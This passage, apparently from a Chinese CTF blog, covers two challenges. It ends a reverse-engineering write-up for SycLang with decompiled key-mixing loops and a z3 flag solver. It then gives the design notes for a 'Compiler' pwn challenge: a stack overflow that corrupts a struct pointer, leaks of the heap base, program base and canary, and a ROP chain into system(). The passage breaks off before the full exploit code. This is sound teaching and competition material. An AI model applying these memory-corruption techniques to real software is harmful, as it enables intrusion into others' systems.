class="number">8</span>;i++)&#123;</span><br><span class="line">    x = e1.L[i];</span><br><span class="line">    y = e1.R[i];</span><br><span class="line">    z = e1.X[i];</span><br><span class="line">    kx = e1.key[x];</span><br><span class="line">    ky = e1.key[y];</span><br><span class="line">    kx += z;</span><br><span class="line">    ky -= z; </span><br><span class="line">    e1.key[x] = kx;</span><br><span class="line">    e1.key[y] = ky;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">24</span>;i++)&#123;</span><br><span class="line">    kx = e1.key[i];</span><br><span class="line">    x = i<span class="number">-1</span>;</span><br><span class="line">    z = e1.key[x];</span><br><span class="line">    kx += z;</span><br><span class="line">    e1.key[i] = kx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">e2.key[<span class="number">0</span>]=<span class="number">252</span>;</span><br><span class="line">e2.key[<span class="number">1</span>]=<span class="number">352</span>;</span><br><span class="line">e2.key[<span class="number">2</span>]=<span class="number">484</span>;</span><br><span class="line">e2.key[<span class="number">3</span>]=<span class="number">470</span>;</span><br><span class="line">e2.key[<span class="number">4</span>]=<span class="number">496</span>;</span><br><span class="line">e2.key[<span class="number">5</span>]=<span class="number">487</span>;</span><br><span class="line">e2.key[<span class="number">6</span>]=<span class="number">539</span>;</span><br><span class="line">e2.key[<span class="number">7</span>]=<span class="number">585</span>;</span><br><span class="line">e2.key[<span class="number">8</span>]=<span class="number">447</span>;</span><br><span class="line">e2.key[<span class="number">9</span>]=<span class="number">474</span>;</span><br><span class="line">e2.key[<span class="number">10</span>]=<span class="number">577</span>;</span><br><span class="line">e2.key[<span class="number">11</span>]=<span class="number">454</span>;</span><br><span class="line">e2.key[<span class="number">12</span>]=<span class="number">466</span>;</span><br><span class="line">e2.key[<span class="number">13</span>]=<span class="number">345</span>;</span><br><span class="line">e2.key[<span class="number">14</span>]=<span class="number">344</span>;</span><br><span class="line">e2.key[<span class="number">15</span>]=<span class="number">486</span>;</span><br><span class="line">e2.key[<span class="number">16</span>]=<span class="number">501</span>;</span><br><span class="line">e2.key[<span class="number">17</span>]=<span class="number">423</span>;</span><br><span class="line">e2.key[<span class="number">18</span>]=<span class="number">490</span>;</span><br><span class="line">e2.key[<span class="number">19</span>]=<span class="number">375</span>;</span><br><span class="line">e2.key[<span class="number">20</span>]=<span class="number">257</span>;</span><br><span class="line">e2.key[<span class="number">21</span>]=<span class="number">203</span>;</span><br><span class="line">e2.key[<span class="number">22</span>]=<span class="number">265</span>;</span><br><span class="line">e2.key[<span class="number">23</span>]=<span class="number">125</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">    x = i + i + i;</span><br><span class="line">    kx = e1.key[x];</span><br><span class="line">    e2.X[i] = kx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">23</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">    y = i;</span><br><span class="line">    ky = e2.key[y];</span><br><span class="line">    x = i;</span><br><span class="line">    x -= <span class="number">1</span>;</span><br><span class="line">    kx = e2.key[x];</span><br><span class="line">    kz = ky - kx;</span><br><span class="line">    e2.key[i] = kz; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">    x = e1.L[i];</span><br><span class="line">    y = e1.R[i];</span><br><span class="line">    z = e2.X[i];</span><br><span class="line">    kx = e2.key[x];</span><br><span class="line">    ky = e2.key[y];</span><br><span class="line">    kx -= z;</span><br><span class="line">    ky += z; </span><br><span class="line">    e2.key[x] = kx;</span><br><span class="line">    e2.key[y] = ky;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">24</span>;i++)&#123;</span><br><span class="line">    kx = e2.key[i];</span><br><span class="line">    x = i<span class="number">-1</span>;</span><br><span class="line">    z = e2.key[x];</span><br><span class="line">    kx += z;</span><br><span class="line">    e2.key[i] = kx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是公式推导的过程：</p>
<img src="/2023/06/21/SycLang%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/page1.png" class title="page1">     
<img src="/2023/06/21/SycLang%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/page2.png" class title="page2">    
<img src="/2023/06/21/SycLang%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/page3.png" class title="page3">    
<p>通过 z3 即可求解 flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    s.append(Int(<span class="string">&#x27;S&#x27;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line">x = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">0</span>]+<span class="number">22</span> == <span class="number">252</span>)</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">1</span>]+<span class="number">23</span> == <span class="number">352</span>)</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">2</span>]+<span class="number">85</span> == <span class="number">484</span>)</span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">3</span>]+<span class="number">85</span> == <span class="number">470</span>)</span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">4</span>]+<span class="number">35</span> == <span class="number">496</span>)</span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">5</span>]+<span class="number">35</span> == <span class="number">487</span>)</span><br><span class="line"><span class="comment"># 6</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">6</span>]+<span class="number">27</span> == <span class="number">539</span>)</span><br><span class="line"><span class="comment"># 7</span></span><br><span class="line">x.add(s[<span class="number">0</span>]+s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">7</span>]+<span class="number">27</span> == <span class="number">585</span>)</span><br><span class="line"><span class="comment"># 8</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">8</span>]+<span class="number">5</span> == <span class="number">447</span>)</span><br><span class="line"><span class="comment"># 9</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]-<span class="number">91</span> == <span class="number">474</span>)</span><br><span class="line"><span class="comment"># 10</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">6</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">10</span>]-<span class="number">105</span> == <span class="number">577</span>)</span><br><span class="line"><span class="comment"># 11</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">11</span>]-<span class="number">167</span> == <span class="number">454</span>)</span><br><span class="line"><span class="comment"># 12</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">21</span>]+s[<span class="number">12</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">12</span>]-<span class="number">167</span> == <span class="number">466</span>)</span><br><span class="line"><span class="comment"># 13</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">21</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">13</span>]-<span class="number">159</span> == <span class="number">345</span>)</span><br><span class="line"><span class="comment"># 14</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">21</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">14</span>]-<span class="number">159</span> == <span class="number">344</span>)</span><br><span class="line"><span class="comment"># 15</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">21</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">3</span>]+s[<span class="number">15</span>]-<span class="number">113</span> == <span class="number">486</span>)</span><br><span class="line"><span class="comment"># 16</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">21</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">3</span>]+s[<span class="number">16</span>]-<span class="number">113</span> == <span class="number">501</span>)</span><br><span class="line"><span class="comment"># 17</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">3</span>]+s[<span class="number">17</span>]-<span class="number">63</span> == <span class="number">423</span>)</span><br><span class="line"><span class="comment"># 18</span></span><br><span class="line">x.add(s[<span class="number">18</span>]+s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">3</span>]+s[<span class="number">18</span>]-<span class="number">63</span> == <span class="number">490</span>)</span><br><span class="line"><span class="comment"># 19</span></span><br><span class="line">x.add(s[<span class="number">15</span>]+s[<span class="number">9</span>]+s[<span class="number">3</span>]+s[<span class="number">19</span>]-<span class="number">64</span> == <span class="number">375</span>)</span><br><span class="line"><span class="comment"># 20</span></span><br><span class="line">x.add(s[<span class="number">15</span>]+s[<span class="number">3</span>]+s[<span class="number">20</span>]-<span class="number">50</span> == <span class="number">257</span>)</span><br><span class="line"><span class="comment"># 21</span></span><br><span class="line">x.add(s[<span class="number">3</span>]+s[<span class="number">21</span>]+<span class="number">46</span> == <span class="number">203</span>)</span><br><span class="line"><span class="comment"># 22</span></span><br><span class="line">x.add(s[<span class="number">3</span>]+s[<span class="number">22</span>]+<span class="number">46</span> == <span class="number">265</span>)</span><br><span class="line"><span class="comment"># 23</span></span><br><span class="line">x.add(s[<span class="number">23</span>] == <span class="number">125</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(x.check()==sat):</span><br><span class="line">    model = x.model()</span><br><span class="line">    <span class="built_in">print</span>(model)</span><br><span class="line"></span><br><span class="line">model = x.model()</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(model).split(<span class="string">&#x27;,&#x27;</span>):</span><br><span class="line">    pos, val = i.split(<span class="string">&#x27;=&#x27;</span>)[:<span class="number">2</span>]</span><br><span class="line">    pos = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([i <span class="keyword">for</span> i <span class="keyword">in</span> pos <span class="keyword">if</span> i.isdigit()]))</span><br><span class="line">    val = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([i <span class="keyword">for</span> i <span class="keyword">in</span> val <span class="keyword">if</span> i.isdigit()]))</span><br><span class="line">    flag[pos] = <span class="built_in">chr</span>(val)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/21/Compiler%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/21/Compiler%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">Compiler出题思路</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-21 10:13:08 / Modified: 10:15:56" itemprop="dateCreated datePublished" datetime="2023-06-21T10:13:08+08:00">2023-06-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF-Challenge/" itemprop="url" rel="index"><span itemprop="name">CTF Challenge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Compiler 出题思路</strong></p>
<p>本题目是一个我自己写的编译器，将其包装成菜单，并提供了以下4个功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>get IR</span><br><span class="line"><span class="number">2.</span>get <span class="keyword">asm</span></span><br><span class="line"><span class="number">3.</span>get bin</span><br><span class="line"><span class="number">4.</span>input code</span><br><span class="line"><span class="number">5.</span><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<ul>
<li>获取中间代码</li>
<li>获取汇编代码</li>
<li>获取二进制文件</li>
<li>输入源代码</li>
</ul>
<p>由于 “获取汇编代码” 这个功能会被逆向题目 SycLang 利用，于是本题目不提供 trans_asm 文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">  sub_CB6A(<span class="string">&quot;translation Three-address-codes to Assemble-code&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;./trans_asm&quot;</span>);</span><br><span class="line">  sub_CB6A(<span class="string">&quot;done: get demo.s&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">  sub_CB6A(<span class="string">&quot;translation Assemble-code to Binary-code&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;gcc demo.s -o demo&quot;</span>);</span><br><span class="line">  sub_CB6A(<span class="string">&quot;done: get demo&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：这里偷个懒，后端直接就是 gcc，同时这里也提供了 system 函数</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>本题目有两处溢出：</p>
<p>本题目在词法分析的过程中，对符号的长度和数目没有限制，但符号表却非常长，在这里进行入侵不太现实</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000020001</span> ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+qword_20001 dq <span class="number">30</span><span class="function">DBh <span class="title">dup</span><span class="params">(?)</span>                         </span>; <span class="number">0</span></span><br><span class="line">.bss:<span class="number">0000000000020001</span> ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; DATA XREF: .rodata:off_13000↑o</span><br><span class="line">.bss:<span class="number">00000000000386</span>D9 ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DA ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DB ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DC ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DD ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DE ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DF ??                            db    ? ;</span><br></pre></td></tr></table></figure>
<p>另外一处就是位于多级数组处理的栈溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub_427C(*(_QWORD *)(*(_QWORD *)(v15 + <span class="number">104</span>) + <span class="number">96LL</span>));</span><br><span class="line"><span class="keyword">if</span> ( **(_DWORD **)(*(_QWORD *)(v15 + <span class="number">104</span>) + <span class="number">96LL</span>) == <span class="number">258</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v18[v10++] = *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v15 + <span class="number">104</span>) + <span class="number">96LL</span>) + <span class="number">40LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里原本的逻辑就是记录多级数组每一级的容量，如果多级数组的级数过多就会发生栈溢出</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v18[<span class="number">6</span>]; <span class="comment">// [rsp+4Ah] [rbp-16h]</span></span><br><span class="line"><span class="keyword">void</span> *v19; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里的 v19 是一个结构体指针，其目的是为了记录以变量为索引的数组（例如：<code>arr[i]</code> 中的 <code>i</code> 就会被进行记录）</li>
</ul>
<p>下面是这个结构体的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">Value</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> type_id[<span class="number">32</span>]; </span><br><span class="line">    <span class="keyword">int</span> type_int;     </span><br><span class="line">    <span class="keyword">float</span> type_float;</span><br><span class="line">    <span class="keyword">char</span> type_char;</span><br><span class="line">    <span class="keyword">char</span> type_string[<span class="number">32</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Array</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> kind;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">Value</span> <span class="title">value</span>;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Array</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>Array-&gt;name 存储有该符号的名称，它可以在多个地方被打印</li>
</ul>
<p>由于栈溢出，v19 可以被覆盖低位，进而将 Array-&gt;name 控制为我们需要的值</p>
<p>本程序有两处地方可供泄露：</p>
<p>当 Array-&gt;name 与符号表中的所有符号都不匹配时，就会发出报错：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v13 = sub_33AB(v14 + <span class="number">48</span>);</span><br><span class="line"><span class="keyword">if</span> ( v13 == <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  sub_3373(*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(*(_QWORD *)(a1 + <span class="number">96</span>) + <span class="number">200LL</span>), v14 + <span class="number">48</span>, <span class="string">&quot;未定义，语义错误&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v16;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在报错中会输出该符合的名称 Array-&gt;name</li>
</ul>
<p>当 Array-&gt;name 与符号表中任意一个符号匹配时，就会将其输出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; *(_DWORD *)(v11 + <span class="number">4</span>) - <span class="number">1</span>; ++i )</span><br><span class="line">  qword_19180 *= byte_19310[<span class="number">128</span> * (__int64)v7 + *(_DWORD *)(v11 + <span class="number">4</span>) - i];</span><br><span class="line"><span class="built_in">sprintf</span>(byte_190E0, <span class="string">&quot;&#123;#%d&#125;*&#123;%s&lt;+%d&gt;&#125;+&quot;</span>, qword_19180, (<span class="keyword">const</span> <span class="keyword">char</span> *)(v11 + <span class="number">16</span>), *(_QWORD *)(v11 + <span class="number">8</span>));</span><br><span class="line"><span class="built_in">strcat</span>(dest, byte_190E0);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>先通过栈溢出覆盖 Array 指针的低位，控制 Array-&gt;name 指向一个堆地址，进而泄露 heap_base</p>
<p>本程序在拷贝数据时没有进行初始化，因此有部分栈上的数据被拷贝到堆中，这些数据都可以通过 Array-&gt;name 进行泄露</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; canary </span><br><span class="line">canary : <span class="number">0x2ece71e5ac86af00</span></span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x2ece71e5ac86af00</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>\x00\xaf\x86\xac\xe5q\xce<span class="number">.&#x27;</span></span><br><span class="line">[heap]          <span class="number">0x55f0ee3be940</span> <span class="number">0x2ece71e5ac86af00</span></span><br><span class="line">[heap]          <span class="number">0x55f0ee3be9f8</span> <span class="number">0x2ece71e5ac86af00</span></span><br><span class="line">[heap]          <span class="number">0x55f0ee3bea30</span> <span class="number">0x2ece71e5ac86af00</span></span><br></pre></td></tr></table></figure>
<p>获取 heap_base 后，就可以将 Array-&gt;name 指向更大范围的堆空间，进而泄露 pro_base，canary</p>
<p>最后利用现成的 system 布置一个 ROP 就结束了</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span 